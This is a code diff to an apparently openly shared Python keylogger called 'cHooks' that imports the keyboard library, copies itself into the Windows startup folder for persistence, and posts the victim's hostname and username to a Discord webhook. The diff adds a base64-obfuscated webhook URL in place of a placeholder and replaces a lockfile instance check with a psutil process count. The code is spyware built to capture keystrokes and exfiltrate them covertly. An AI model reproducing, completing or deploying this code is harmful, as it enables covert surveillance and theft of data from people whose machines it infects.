@@ -1,18 +1,16 @@
 import os
+import sys
 import asyncio
 import keyboard
 import socket
 import requests
 import base64
-import portalocker
-import ctypes
+import psutil
 import shutil
-import tkinter as tk
-from sys import argv
 from discord import Embed
 
 
-WEBHOOK_64 = "Your_Encrypted_Webhook_Here"
+WEBHOOK_64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzODc4NzMzMTIxNDY5MjQ2My9RM1VtbVh6RFZCMndnMExkelEyMklneGhJM1JIdlo3bXU0cHVZWXMxeElacTlnd3FsZUpiMHI3TlNkUWVNa0lIZXFqaA=="
 SECRET = base64.b64decode(WEBHOOK_64).decode()
 
 class NTStartUp:
@@ -21,7 +19,7 @@ class NTStartUp:
         
     def startup(self):
         try:
-            shutil.copy2(argv[0], self.startup_loc)
+            shutil.copy2(sys.argv[0], self.startup_loc)
         except Exception:
             pass
     
@@ -57,15 +55,17 @@ class NTStartUp:
 
 
     async def main(self):
-        lock_file = open('.lockfile', 'w')
-        ctypes.windll.kernel32.SetFileAttributesW('.lockfile', 2)
-        try:
-            portalocker.lock(lock_file, portalocker.LOCK_EX | portalocker.LOCK_NB)
-        except portalocker.LockException:
-            root = tk.Tk()
-            root.withdraw()
-            root.destroy()
-            return
+        def check_process_running():
+            current_pid = os.getpid()
+            process_count = 0
+            for process in psutil.process_iter(['pid', 'name']):
+                if process.info['name'].lower() == os.path.basename(sys.executable):
+                    if process.info['pid'] != current_pid:
+                        process_count += 1
+            return process_count
+
+        if check_process_running() > 1:
+            os._exit(0)
 
         embed = Embed(title=f'cHooks™ | {hostname} ({username})', description='Session started!', color=0x0cc444)
         embed.set_footer(text="💚 Made by github.com/AWeirDKiD")
